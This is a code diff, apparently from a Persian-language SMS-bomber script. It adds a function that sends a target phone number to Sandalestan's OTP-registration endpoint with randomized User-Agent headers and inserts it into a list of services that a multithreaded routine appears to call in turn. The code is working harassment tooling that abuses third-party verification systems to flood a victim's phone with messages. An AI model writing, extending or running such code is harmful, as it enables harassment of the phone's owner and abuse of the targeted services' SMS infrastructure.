@@ -63,7 +63,52 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-
+def Sandalestan(phone):
+    try:
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        }
+        
+        response = requests.get(
+            url, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Sandalestan Response Length: {len(response.text)} characters{a}')
+        
+        if response.status_code == 200:
+            # بررسی اینکه آیا صفحه به درستی لود شده و حاوی پیام موفقیت است
+            if len(response.text) > 100:  # اگر صفحه خالی نباشد
+                if "success" in response.text.lower() or "otp" in response.text.lower() or "کد" in response.text:
+                    print(f'{g}(Sandalestan) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{y}(Sandalestan) Page loaded but success message not detected{a}')
+                    return True  # ممکن است کد ارسال شده باشد اما پیام واضح نباشد
+            else:
+                print(f'{r}[-] Sandalestan: Empty response{a}')
+                return False
+        else:
+            print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Sandalestan Exception: {e}{a}')
+        return False
+        
 
 def Footini(phone):
     try:
@@ -406,7 +451,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [SibApp, ShahreSandal, Footini, Balad, nillarayeshi]
+services = [SibApp, ShahreSandal, Footini, Sandalestan, Balad, nillarayeshi]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
